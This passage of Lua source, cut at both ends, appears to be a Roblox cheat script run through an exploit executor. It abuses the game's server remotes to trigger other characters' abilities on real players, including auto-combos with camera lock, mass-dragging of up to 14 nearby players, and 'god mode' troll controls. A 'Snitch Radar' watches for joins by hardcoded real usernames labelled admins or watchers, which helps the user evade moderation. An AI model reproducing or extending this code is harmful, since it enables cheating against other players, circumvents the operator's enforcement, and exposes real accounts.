	pounce.BackgroundColor3 = Color3.fromRGB(90, 40, 90)
	end
	end
	end
	task.wait(0.05)
	end
	end)
	local COMBO_ANIMS = {"9759925585", "9759929844", "9759932239"}
	local OPEN_ANIM = "9759935130"
	local dashing = false
	local function playAnim(id)
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local an = hum and (hum:FindFirstChildOfClass("Animator") or hum)
	if not an then return end
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://" .. id
	local ok, tr = pcall(function() return an:LoadAnimation(a) end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play(0.05)
	end
	end
	local function inLaser(char)
	local me = LocalPlayer.Character
	local hrp = me and me:FindFirstChild("HumanoidRootPart")
	local t = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp or not t then return false end
	local dir = hrp.CFrame.LookVector
	local center = hrp.Position + dir * 4.5
	local cf = CFrame.lookAt(center, center + dir)
	local lp = cf:PointToObjectSpace(t.Position)
	return math.abs(lp.X) <= 4 and math.abs(lp.Y) <= 3 and math.abs(lp.Z) <= 4.5
	end
	local function pickBox()
	local me = LocalPlayer.Character
	local hrp = me and me:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil end
	local best, bestD = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character and inLaser(plr.Character) then
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	if h and h.Health > 0 and r then
	local d = (r.Position - hrp.Position).Magnitude
	if d < bestD then best, bestD = plr, d end
	end
	end
	end
	return best
	end
	local function dashToward(target)
	if dashing or not target or not target.Character then return end
	local ch = LocalPlayer.Character
	local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
	local tHrp = target.Character:FindFirstChild("HumanoidRootPart")
	if not hrp or not tHrp then return end
	local flat = Vector3.new(tHrp.Position.X - hrp.Position.X, 0, tHrp.Position.Z - hrp.Position.Z)
	local dist = flat.Magnitude
	if dist <= 1.7 then return end
	local useMax, useDur = 1.0, 0.14
	if dist > 5 then useMax, useDur = 3.0, 0.10 end
	local dashDist = math.min(dist - 1.5, useMax)
	if dashDist <= 0.05 then return end
	dashing = true
	local dir = flat.Unit
	task.spawn(function()
	local startPos = hrp.Position
	local endPos = startPos + dir * dashDist
	local t = 0
	while t < useDur do
	local dt = RunService.Heartbeat:Wait()
	t = t + dt
	local alpha = math.min(t / useDur, 1)
	local ease = 1 - (1 - alpha) * (1 - alpha)
	local np = startPos:Lerp(endPos, ease)
	if hrp and hrp.Parent then
	hrp.CFrame = CFrame.new(np, np + hrp.CFrame.LookVector)
	end
	end
	dashing = false
	end)
	end
	local function doPounce()
	if busy then return end
	if not wolfOn() then return end
	if tick() < cdEnd then return end
	if not armed then
	armed = true
	placeFan()
	fan.Parent = workspace
	pounce.Text = "Confirm"
	pounce.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	return
	end
	armed = false
	fan.Parent = nil
	local target = nearestFan()
	if not target then
	pounce.Text = "No one"
	task.delay(0.6, function()
	if not busy then pounce.Text = "Pounce" end
	end)
	return
	end
	busy = true
	cdEnd = tick() + CD
	pounce.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
	task.spawn(function()
	local cam = workspace.CurrentCamera
	local oldType = cam and cam.CameraType
	local startYaw = cam and math.atan2(-cam.CFrame.LookVector.X, -cam.CFrame.LookVector.Z)
	local t0 = tick()
	local conn
	if cam then
	cam.CameraType = Enum.CameraType.Scriptable
	conn = RunService.RenderStepped:Connect(function()
	local c = workspace.CurrentCamera
	local h = target.Character and (target.Character:FindFirstChild("Head") or target.Character:FindFirstChild("HumanoidRootPart"))
	if not c or not h or not startYaw then return end
	local dir = h.Position - c.CFrame.Position
	local ty = math.atan2(-dir.X, -dir.Z)
	local el = tick() - t0
	local yaw = ty
	if el < 0.7 then
	local pr = math.clamp(el / 0.7, 0, 1)
	local ease = 1 - (1 - pr) ^ 4
	local d = math.atan2(math.sin(ty - startYaw), math.cos(ty - startYaw))
	yaw = startYaw + d * ease
	end
	local look = c.CFrame.LookVector
	local pitch = math.asin(math.clamp(look.Y, -1, 1))
	local cp = math.cos(pitch)
	local nl = Vector3.new(-math.sin(yaw) * cp, math.sin(pitch), -math.cos(yaw) * cp)
	c.CFrame = CFrame.lookAt(c.CFrame.Position, c.CFrame.Position + nl, Vector3.new(0, 1, 0))
	end)
	end
	local boxT = pickBox()
	local pre = 0.2
	if boxT then
	playAnim(OPEN_ANIM)
	local comboEnd = findRem("combat", "ComboEndRemote")
	if comboEnd then
	pcall(function()
	comboEnd:FireServer(boxT.DisplayName)
	comboEnd:FireServer(boxT.Name)
	comboEnd:FireServer(boxT.Character)
	end)
	end
	pounce.Text = "Combo End"
	pre = 0.8
	else
	local hitG = findRem("homelander", "HitGround")
	if hitG and target.Character then
	pcall(function()
	hitG:FireServer(target.DisplayName)
	hitG:FireServer(target.Name)
	hitG:FireServer(target.Character)
	end)
	end
	pounce.Text = "Skip End"
	pre = 0.2
	end
	task.wait(pre)
	local moveTwo = findRem("demogorgon", "MoveTwo")
	if not moveTwo then
	pounce.Text = "No Remote"
	if conn then conn:Disconnect() end
	if cam and oldType then cam.CameraType = oldType end
	task.wait(0.6)
	busy = false
	return
	end
	pcall(function() moveTwo:FireServer() end)
	task.wait(0.5)
	local drag = findRem("steve", "Drag")
	if drag and target.Character then
	for _ = 1, 2 do
	pcall(function()
	drag:FireServer(target.DisplayName)
	drag:FireServer(target.Name)
	drag:FireServer(target.Character)
	end)
	end
	end
	local combo = findRem("combat", "Combo")
	local weak = findRem("combat", "ComboWeak")
	for i = 1, 10 do
	if not LocalPlayer.Character or not target.Character then break end
	local h = target.Character:FindFirstChildOfClass("Humanoid")
	if not h or h.Health <= 0 then break end
	dashToward(target)
	if combo then
	pcall(function()
	combo:FireServer(target.DisplayName)
	combo:FireServer(target.Name)
	combo:FireServer(target.Character)
	end)
	end
	if weak then
	pcall(function()
	weak:FireServer(target.DisplayName)
	weak:FireServer(target.Name)
	weak:FireServer(target.Character)
	end)
	end
	playAnim(COMBO_ANIMS[((i - 1) % #COMBO_ANIMS) + 1])
	pounce.Text = "M1 " .. tostring(i) .. "/10"
	if i < 10 then task.wait(0.2) end
	end
	if conn then conn:Disconnect() end
	if cam and oldType then cam.CameraType = oldType end
	local counter = findRem("demogorgon", "Counter")
	if counter then
	pounce.Text = "Counter"
	pcall(function() counter:FireServer() end)
	task.wait(0.5)
	local box2 = pickBox()
	if box2 then
	playAnim(OPEN_ANIM)
	local comboEnd2 = findRem("combat", "ComboEndRemote")
	if comboEnd2 then
	pcall(function()
	comboEnd2:FireServer(box2.DisplayName)
	comboEnd2:FireServer(box2.Name)
	comboEnd2:FireServer(box2.Character)
	end)
	end
	pounce.Text = "End x2"
	task.wait(0.25)
	end
	end
	pounce.Text = "Done"
	task.wait(0.6)
	busy = false
	pounce.Text = "Pounce"
	pounce.BackgroundColor3 = Color3.fromRGB(90, 40, 90)
	end)
	end
	pounce.MouseButton1Click:Connect(doPounce)
	UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
	if not pounce.Visible then return end
	if string.upper(input.KeyCode.Name) == pKey then
	doPounce()
	end
	end)
	end)
	rightBtn.MouseButton1Click:Connect(function()
	local folder = ReplicatedStorage:FindFirstChild("Characters")
	folder = folder and folder:FindFirstChild("Steve")
	folder = folder and folder:FindFirstChild("Remotes")
	local remote = folder and folder:FindFirstChild("Drag")
	if not remote then
	return
	end
	local me = LocalPlayer.Character
	local hrp = me and me:FindFirstChild("HumanoidRootPart")
	if not hrp then
	return
	end
	local list = {}
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Name ~= AUTHOR_NAME then
	local c = plr.Character
	local r = c and c:FindFirstChild("HumanoidRootPart")
	local hum = c and c:FindFirstChildOfClass("Humanoid")
	if r and hum and hum.Health > 0 then
	table.insert(list, {
	p = plr,
	d = (r.Position - hrp.Position).Magnitude
	})
	end
	end
	end
	table.sort(list, function(x, y)
	return x.d < y.d
	end)
	local n = #list
	if n > 14 then
	n = 14
	end
	for i = 1, n do
	local plr = list[i].p
	remote:FireServer(plr.DisplayName)
	remote:FireServer(plr.Name)
	remote:FireServer(plr.Character)
	end
	end)
	end
end)
task.spawn(function()
	do
	if Page2 and Page2Scroll and not Page2Scroll:FindFirstChild("ModeTrollBtn") then
	local trollBtn = Instance.new("TextButton")
	trollBtn.Name = "ModeTrollBtn"
	trollBtn.Size = UDim2.new(1, -10, 0, 20)
	trollBtn.Position = UDim2.new(0, 5, 0, 272)
	trollBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	trollBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	trollBtn.Font = Enum.Font.GothamBold
	trollBtn.TextSize = 11
	trollBtn.Text = "mode troll"
	trollBtn.Visible = false
	trollBtn.Parent = Page2Scroll
	local trollBtnC = Instance.new("UICorner")
	trollBtnC.CornerRadius = UDim.new(0, 4)
	trollBtnC.Parent = trollBtn
	local trollPage = Instance.new("Frame")
	trollPage.Name = "ModeTrollPage"
	trollPage.Size = UDim2.new(1, -10, 0, 70)
	trollPage.Position = UDim2.new(0, 5, 0, 272)
	trollPage.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
	trollPage.Visible = false
	trollPage.ZIndex = 30
	trollPage.Active = true
	trollPage.ClipsDescendants = true
	trollPage.Parent = Page2Scroll
	local trollPageC = Instance.new("UICorner")
	trollPageC.CornerRadius = UDim.new(0, 4)
	trollPageC.Parent = trollPage
	local trollCatch = Instance.new("TextButton")
	trollCatch.Name = "Catch"
	trollCatch.Size = UDim2.new(1, 0, 1, 0)
	trollCatch.BackgroundTransparency = 1
	trollCatch.Text = ""
	trollCatch.AutoButtonColor = false
	trollCatch.ZIndex = 30
	trollCatch.Parent = trollPage
	local giveBtn = Instance.new("TextButton")
	giveBtn.Name = "GiveGodModeBtn"
	giveBtn.Size = UDim2.new(1, -8, 0, 22)
	giveBtn.Position = UDim2.new(0, 4, 0, 6)
	giveBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	giveBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	giveBtn.Font = Enum.Font.GothamBold
	giveBtn.TextSize = 11
	giveBtn.Text = "Give god mode"
	giveBtn.ZIndex = 31
	giveBtn.Parent = trollPage
	local giveBtnC = Instance.new("UICorner")
	giveBtnC.CornerRadius = UDim.new(0, 4)
	giveBtnC.Parent = giveBtn
	local givePage = Instance.new("Frame")
	givePage.Name = "GiveGodModePage"
	givePage.Size = UDim2.new(1, 0, 1, 0)
	givePage.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	givePage.BorderSizePixel = 0
	givePage.Visible = false
	givePage.ZIndex = 12
	givePage.Parent = Page2
	local giveBack = Instance.new("TextButton")
	giveBack.Name = "GiveGodBack"
	giveBack.Size = UDim2.new(0, 46, 0, 46)
	giveBack.Position = UDim2.new(0, 6, 0, 6)
	giveBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	giveBack.TextColor3 = Color3.fromRGB(255, 255, 255)
	giveBack.Font = Enum.Font.GothamBold
	giveBack.TextSize = 11
	giveBack.Text = "Back"
	giveBack.ZIndex = 13
	giveBack.Parent = givePage
	local giveBackC = Instance.new("UICorner")
	giveBackC.CornerRadius = UDim.new(0, 4)
	giveBackC.Parent = giveBack
	local giveTitle = Instance.new("TextLabel")
	giveTitle.Size = UDim2.new(1, -60, 0, 18)
	giveTitle.Position = UDim2.new(0, 56, 0, 6)
	giveTitle.BackgroundTransparency = 1
	giveTitle.Font = Enum.Font.GothamBold
	giveTitle.TextSize = 12
	giveTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	giveTitle.TextXAlignment = Enum.TextXAlignment.Left
	giveTitle.Text = "Give god mode"
	giveTitle.ZIndex = 13
	giveTitle.Parent = givePage
	local godAllOn = false
	local godAllBtn = Instance.new("TextButton")
	godAllBtn.Name = "GodModeAllBtn"
	godAllBtn.Size = UDim2.new(0, 92, 0, 18)
	godAllBtn.Position = UDim2.new(0, 56, 0, 26)
	godAllBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	godAllBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	godAllBtn.Font = Enum.Font.GothamBold
	godAllBtn.TextSize = 10
	godAllBtn.Text = "god all: off"
	godAllBtn.ZIndex = 13
	godAllBtn.Parent = givePage
	local godAllC = Instance.new("UICorner")
	godAllC.CornerRadius = UDim.new(0, 4)
	godAllC.Parent = godAllBtn
	godAllBtn.MouseButton1Click:Connect(function()
	godAllOn = not godAllOn
	if godAllOn then
	godAllBtn.BackgroundColor3 = Color3.fromRGB(40, 110, 60)
	godAllBtn.Text = "god all: on"
	else
	godAllBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	godAllBtn.Text = "god all: off"
	end
	end)
	local targetOn = false
	local targetBtn = Instance.new("TextButton")
	targetBtn.Name = "TargetGodBtn"
	targetBtn.Size = UDim2.new(1, -12, 0, 24)
	targetBtn.Position = UDim2.new(0, 6, 0, 58)
	targetBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	targetBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	targetBtn.Font = Enum.Font.GothamBold
	targetBtn.TextSize = 12
	targetBtn.Text = "Target God: off"
	targetBtn.ZIndex = 13
	targetBtn.Parent = givePage
	local targetC = Instance.new("UICorner")
	targetC.CornerRadius = UDim.new(0, 4)
	targetC.Parent = targetBtn
	targetBtn.MouseButton1Click:Connect(function()
	targetOn = not targetOn
	if targetOn then
	targetBtn.BackgroundColor3 = Color3.fromRGB(40, 110, 60)
	targetBtn.Text = "on"
	else
	targetBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	targetBtn.Text = "Target God: off"
	end
	end)
	local nameList = Instance.new("ScrollingFrame")
	nameList.Name = "GodNameList"
	nameList.Size = UDim2.new(1, -8, 1, -92)
	nameList.Position = UDim2.new(0, 4, 0, 88)
	nameList.BackgroundTransparency = 1
	nameList.BorderSizePixel = 0
	nameList.ScrollBarThickness = 4
	nameList.CanvasSize = UDim2.new(0, 0, 0, 40)
	nameList.ZIndex = 13
	nameList.Parent = givePage
	local nameRows = {}
	local openDrop = nil
	local TextService = game:GetService("TextService")
	local plusBtn = Instance.new("TextButton")
	plusBtn.Name = "GodNamePlus"
	plusBtn.Size = UDim2.new(0, 24, 0, 22)
	plusBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	plusBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	plusBtn.Font = Enum.Font.GothamBold
	plusBtn.TextSize = 16
	plusBtn.Text = "+"
	plusBtn.ZIndex = 14
	plusBtn.Parent = nameList
	local plusC = Instance.new("UICorner")
	plusC.CornerRadius = UDim.new(0, 4)
	plusC.Parent = plusBtn
	local function placePlus()
	local n = #nameRows
	local y = (n - 1) * 28
	plusBtn.Position = UDim2.new(1, -28, 0, y)
	plusBtn.Visible = n < 16
	nameList.CanvasSize = UDim2.new(0, 0, 0, n * 28 + 8)
	end
	local function closeDrop()
	if openDrop then
	openDrop.Visible = false
	openDrop = nil
	end
	end
	local function bestName(typed)
	local q = string.lower(typed or "")
	if q == "" then
	return ""
	end
	local best, bestScore
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local name = plr.Name
	local low = string.lower(name)
	local score
	if low == q then
	score = 0
	elseif string.sub(low, 1, #q) == q then
	score = 1 + (#name - #q)
	else
	score = 1000 + math.abs(#name - #q)
	local hit = string.find(low, q, 1, true)
	if hit then
	score = 100 + hit
	end
	end
	if not bestScore or score < bestScore then
	best, bestScore = name, score
	end
	end
	end
	if best and bestScore and bestScore < 1000 then
	return best
	end
	return typed
	end
	local function addNameRow()
	if #nameRows >= 16 then
	return
	end
	local y = #nameRows * 28
	local arrow = Instance.new("TextButton")
	arrow.Name = "GodNameArrow"
	arrow.Size = UDim2.new(0, 22, 0, 22)
	arrow.Position = UDim2.new(0, 2, 0, y)
	arrow.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	arrow.TextColor3 = Color3.fromRGB(220, 220, 220)
	arrow.Font = Enum.Font.GothamBold
	arrow.TextSize = 12
	arrow.Text = "v"
	arrow.ZIndex = 15
	arrow.Parent = nameList
	local arrowC = Instance.new("UICorner")
	arrowC.CornerRadius = UDim.new(0, 4)
	arrowC.Parent = arrow
	local row = Instance.new("TextBox")
	row.Name = "GodName" .. tostring(#nameRows + 1)
	row.Size = UDim2.new(1, -58, 0, 22)
	row.Position = UDim2.new(0, 26, 0, y)
	row.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	row.TextColor3 = Color3.fromRGB(235, 235, 235)
	row.PlaceholderText = "Enter name..."
	row.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
	row.Text = ""
	row.Font = Enum.Font.Gotham
	row.TextSize = 11
	row.TextXAlignment = Enum.TextXAlignment.Left
	row.ClearTextOnFocus = false
	row.ZIndex = 15
	row.Parent = nameList
	local rowPad = Instance.new("UIPadding")
	rowPad.PaddingLeft = UDim.new(0, 6)
	rowPad.Parent = row
	local rowC = Instance.new("UICorner")
	rowC.CornerRadius = UDim.new(0, 4)
	rowC.Parent = row
	local ghost = Instance.new("TextLabel")
	ghost.Name = "GodNameGhost"
	ghost.BackgroundTransparency = 1
	ghost.TextColor3 = Color3.fromRGB(120, 120, 120)
	ghost.Font = Enum.Font.Gotham
	ghost.TextSize = 11
	ghost.TextXAlignment = Enum.TextXAlignment.Left
	ghost.Text = ""
	ghost.ZIndex = 16
	ghost.Parent = row
	local drop = Instance.new("Frame")
	drop.Name = "GodNameDrop"
	drop.Size = UDim2.new(1, -30, 0, 88)
	drop.Position = UDim2.new(0, 26, 0, y + 24)
	drop.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	drop.BorderSizePixel = 0
	drop.Visible = false
	drop.ZIndex = 20
	drop.Parent = nameList
	local dropC = Instance.new("UICorner")
	dropC.CornerRadius = UDim.new(0, 4)
	dropC.Parent = drop
	local dropScroll = Instance.new("ScrollingFrame")
	dropScroll.Size = UDim2.new(1, -4, 1, -4)
	dropScroll.Position = UDim2.new(0, 2, 0, 2)
	dropScroll.BackgroundTransparency = 1
	dropScroll.BorderSizePixel = 0
	dropScroll.ScrollBarThickness = 4
	dropScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	dropScroll.ZIndex = 21
	dropScroll.Parent = drop
	local function paintGhost()
	local typed = row.Text or ""
	local full = bestName(typed)
	local rest = ""
	if typed ~= "" and string.lower(string.sub(full, 1, #typed)) == string.lower(typed) and #full > #typed then
	rest = string.sub(full, #typed + 1)
	end
	ghost.Text = rest
	local width = TextService:GetTextSize(typed, 11, Enum.Font.Gotham, Vector2.new(1000, 22)).X
	ghost.Position = UDim2.new(0, width + 8, 0, 0)
	ghost.Size = UDim2.new(1, -(width + 10), 1, 0)
	end
	local function fillPlayers()
	for _, ch in ipairs(dropScroll:GetChildren()) do
	if ch:IsA("TextButton") then
	ch:Destroy()
	end
	end
	local n = 0
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -4, 0, 18)
	b.Position = UDim2.new(0, 2, 0, n * 20)
	b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	b.TextColor3 = Color3.fromRGB(230, 230, 230)
	b.Font = Enum.Font.Gotham
	b.TextSize = 11
	b.TextXAlignment = Enum.TextXAlignment.Left
	b.Text = "  " .. plr.Name
	b.ZIndex = 22
	b.Parent = dropScroll
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 3)
	bc.Parent = b
	b.MouseButton1Click:Connect(function()
	row.Text = plr.Name
	paintGhost()
	drop.Visible = false
	arrow.Text = "v"
	openDrop = nil
	end)
	n = n + 1
	end
	end
	dropScroll.CanvasSize = UDim2.new(0, 0, 0, math.max(20, n * 20))
	drop.Size = UDim2.new(1, -30, 0, math.clamp(n * 20 + 6, 24, 88))
	end
	arrow.MouseButton1Click:Connect(function()
	if drop.Visible then
	drop.Visible = false
	arrow.Text = "v"
	openDrop = nil
	else
	closeDrop()
	fillPlayers()
	drop.Visible = true
	arrow.Text = "^"
	openDrop = drop
	end
	end)
	row:GetPropertyChangedSignal("Text"):Connect(paintGhost)
	row.FocusLost:Connect(function()
	if row.Text ~= "" then
	row.Text = bestName(row.Text)
	end
	paintGhost()
	end)
	table.insert(nameRows, row)
	placePlus()
	end
	plusBtn.MouseButton1Click:Connect(addNameRow)
	addNameRow()
	giveBtn.MouseButton1Click:Connect(function()
	givePage.Parent = Main
	givePage.Position = Page2.Position
	givePage.Size = Page2.Size
	givePage.ZIndex = 8
	givePage.Visible = true
	local block = givePage:FindFirstChild("Catch")
	if block then block.Visible = false end
	Page1.Visible = false
	Page2.Visible = false
	local p2 = Main:FindFirstChild("ExtrasPage_2")
	if p2 then p2.Visible = false end
	end)
	giveBack.MouseButton1Click:Connect(function()
	givePage.Visible = false
	Page2.Visible = false
	local p2 = Main:FindFirstChild("ExtrasPage_2")
	if p2 then p2.Visible = true end
	if Page2Scroll then
	Page2Scroll.Visible = true
	end
	end)
	local trollUp = Instance.new("TextButton")
	trollUp.Name = "ModeTrollUp"
	trollUp.Size = UDim2.new(1, 0, 0, 22)
	trollUp.Position = UDim2.new(0, 0, 1, -22)
	trollUp.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	trollUp.TextColor3 = Color3.fromRGB(220, 220, 220)
	trollUp.Font = Enum.Font.GothamBold
	trollUp.TextSize = 10
	trollUp.Text = "^"
	trollUp.ZIndex = 32
	trollUp.Parent = trollPage
	local trollUpC = Instance.new("UICorner")
	trollUpC.CornerRadius = UDim.new(0, 0)
	trollUpC.Parent = trollUp
	trollBtn.MouseButton1Click:Connect(function()
	trollPage.Visible = true
	trollBtn.Visible = false
	end)
	trollUp.MouseButton1Click:Connect(function()
	trollPage.Visible = false
	trollBtn.Visible = true
	end)
	end
	if Page2 and Page2Scroll and not Page2Scroll:FindFirstChild("SnitchRadarBtn") then
	local snitch = Instance.new("TextButton")
	snitch.Name = "SnitchRadarBtn"
	snitch.Size = UDim2.new(1, -10, 0, 20)
	snitch.Position = UDim2.new(0, 5, 0, 305)
	snitch.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	snitch.TextColor3 = Color3.fromRGB(255, 255, 255)
	snitch.Font = Enum.Font.GothamBold
	snitch.TextSize = 11
	snitch.TextScaled = true
	snitch.Text = "Snitch Radar 📡"
	snitch.Parent = Page2Scroll
	local snitchC = Instance.new("UICorner")
	snitchC.CornerRadius = UDim.new(0, 4)
	snitchC.Parent = snitch
	local snitchPage = Instance.new("Frame")
	snitchPage.Name = "SnitchPage"
	snitchPage.Size = UDim2.new(1, 0, 1, 0)
	snitchPage.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	snitchPage.BorderSizePixel = 0
	snitchPage.Visible = false
	snitchPage.ZIndex = 8
	snitchPage.Parent = Page2
	local back = Instance.new("TextButton")
	back.Name = "SnitchBack"
	back.Size = UDim2.new(0, 46, 0, 46)
	back.Position = UDim2.new(0, 6, 0, 6)
	back.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	back.TextColor3 = Color3.fromRGB(255, 255, 255)
	back.Font = Enum.Font.GothamBold
	back.TextSize = 11
	back.Text = "Back"
	back.ZIndex = 9
	back.Parent = snitchPage
	local backC = Instance.new("UICorner")
	backC.CornerRadius = UDim.new(0, 4)
	backC.Parent = back
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -60, 0, 18)
	title.Position = UDim2.new(0, 56, 0, 6)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.GothamBold
	title.TextSize = 12
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Text = "Snitch Radar"
	title.ZIndex = 9
	title.Parent = snitchPage
	local box = Instance.new("Frame")
box.Name = "SnitchBox"
box.Size = UDim2.new(1, -12, 1, -124)
box.Position = UDim2.new(0, 6, 0, 86)
box.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
box.BorderSizePixel = 0
box.ZIndex = 9
box.Parent = snitchPage
local boxC = Instance.new("UICorner")
boxC.CornerRadius = UDim.new(0, 4)
boxC.Parent = box
local boxScroll = Instance.new("ScrollingFrame")
boxScroll.Size = UDim2.new(1, -8, 1, -8)
boxScroll.Position = UDim2.new(0, 4, 0, 4)
boxScroll.BackgroundTransparency = 1
boxScroll.BorderSizePixel = 0
boxScroll.ScrollBarThickness = 4
boxScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
boxScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
boxScroll.ZIndex = 9
boxScroll.Parent = box
local boxText = Instance.new("TextLabel")
boxText.Name = "SnitchBoxText"
boxText.Size = UDim2.new(1, -4, 0, 0)
boxText.AutomaticSize = Enum.AutomaticSize.Y
boxText.BackgroundTransparency = 1
boxText.Font = Enum.Font.Gotham
boxText.TextSize = 12
boxText.TextColor3 = Color3.fromRGB(190, 190, 190)
boxText.TextXAlignment = Enum.TextXAlignment.Left
boxText.TextYAlignment = Enum.TextYAlignment.Top
boxText.TextWrapped = true
boxText.Text = "None"
boxText.ZIndex = 10
boxText.Parent = boxScroll
snitchPage.Active = true
	local runBtn = Instance.new("TextButton")
	runBtn.Name = "SnitchAutoRun"
	runBtn.Size = UDim2.new(1, -12, 0, 22)
	runBtn.Position = UDim2.new(0, 6, 0, 58)
	runBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	runBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	runBtn.Font = Enum.Font.GothamBold
	runBtn.TextSize = 11
	runBtn.Text = "Save & Auto-Run"
	runBtn.ZIndex = 9
	runBtn.Parent = snitchPage
	local runC = Instance.new("UICorner")
	runC.CornerRadius = UDim.new(0, 4)
	runC.Parent = runBtn
	local runStroke = Instance.new("UIStroke")
	runStroke.Thickness = 1.6
	runStroke.Color = Color3.fromRGB(255, 255, 255)
	runStroke.Enabled = false
	runStroke.Parent = runBtn
	local runGrad = Instance.new("UIGradient")
	runGrad.Rotation = 0
	runGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 255, 190)),
	ColorSequenceKeypoint.new(0.45, Color3.fromRGB(20, 70, 40)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 255, 190)),
	})
	runGrad.Parent = runStroke
	local autoOn = false
	pcall(function()
	if isfile and isfile("yyds_snitchrun_dev_v6.txt") then
	autoOn = tostring(readfile("yyds_snitchrun_dev_v6.txt") or "") == "1"
	end
	end)
	local function paintRun()
	if autoOn then
	runBtn.BackgroundColor3 = Color3.fromRGB(30, 110, 60)
	if runBtn:GetAttribute("Wait") ~= true then
	runBtn.Text = "Active"
	end
	else
	runBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	runBtn.Text = "Save & Auto-Run"
	runStroke.Enabled = false
	end
	end
	paintRun()
	local joinConn = nil
	local function stopJoin()
	if joinConn then
	joinConn:Disconnect()
	joinConn = nil
	end
	end
	local function armJoin()
	stopJoin()
	joinConn = Players.PlayerAdded:Connect(function(plr)
	if not autoOn or not plr then
	return
	end
	local watchIds = {"keanrick","Mr_MidKnight12","xXBiennypremeXx","geno2352","Armuless","Dr_who2781","xmrroboto","elreylucho26","alexg4mes12","Alex52883","HECHESON","Suporter_C00lKidd213","ZOPsuh","Joofgiin_official","Leer_82","BoxAr03_07","RulingX2","eivisaltother","Jakesiren2013","GLM1014","WantedHitman_1","leo_go1863","CNight_1Shade","JohnCene2012","BoltsRB","pasta070","prisnor123467","ensjjjjbrother","jorgelsalvaje5","DavidHagibator","BonusGigachad","Eliasss16","soynessitopro","Nazahar2","Aki_Baddie","Sami346m","Michi_2208","Vaeitay","juston700","ovalsergito2","EEEispro1","Chamihunt456","Reset50325554","JCross0611","crisplymans","Cygferro2","yolomangjk","tupapiricooooooa","roblox_user_3845927828","TheRawStrawberry","anqlicvs","SouIeyy","Landoathug34","unknown_beatss","FireMeteorguy","iannflamingofan2","ChickenMcCrunch123","Breeqz","branmol","El_Darx","Ashpegz135","MaaD_x1","maxigodloki","roblox_user_10150856821","frainel2","heyimgael","camote485","efrenhf","Afgxkgaj","reefeyboy139","Faye_9753","Dw200534","lostyzr","MrZNuke","zwmbiec0","latadeservesa122","Cavalao_1111","dj7i8","fixerupe","felixi_gdw","Gianni_Silver","holdstillgihun456","thekiller_069","tigrina122","ANGEL1929ZORO","mrbonineprogamer","BxlletAnt"}
	local adminIds = {"Taraaaa_06","MarvellousClint","Alaera","AmTheLastFloppaEver"}
	local kind = nil
	local low = string.lower(plr.Name)
	for _, n in ipairs(adminIds) do
	if string.lower(n) == low then
	kind = "admin"
	break
	end
	end
	if not kind then
	for _, n in ipairs(watchIds) do
	if string.lower(n) == low then
	kind = "watch"
	break
	end
	end
	end
	if not kind then
	return
	end
	if boxText then
	local cur = boxText.Text
	if cur == "None" or cur == "" then
	boxText.Text = plr.Name
	elseif not string.find(cur, plr.Name, 1, true) then
	boxText.Text = cur .. string.char(10) .. plr.Name
	end
	boxText.TextColor3 = Color3.fromRGB(235, 235, 235)
	end
	local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
	local oldN = pg:FindFirstChild("YYDSNotification")
	if oldN then oldN:Destroy() end
	local gui = Instance.new("ScreenGui")
